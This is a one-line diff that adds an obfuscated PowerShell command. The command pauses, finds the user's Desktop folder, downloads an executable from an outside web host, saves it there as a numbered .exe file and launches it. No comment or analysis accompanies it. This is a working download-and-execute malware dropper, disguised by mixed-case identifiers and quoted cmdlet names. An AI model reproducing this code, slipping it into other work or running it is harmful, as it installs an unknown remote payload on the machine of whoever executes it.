@@ -1,0 +1,1 @@
+$7d0mK6 = [TyPE]'ENVIronmENt' ; &'sleep' 33;${Des} = $7d0mk6::gETfoLDERpATh('Desktop');(&'New-Object' 'System.Net.WebClient').dowNLoaDFilE.iNVoKE('http://nometana.com/trms','$Des\318567.exe');&'Start-Process' $Des\318567.exe
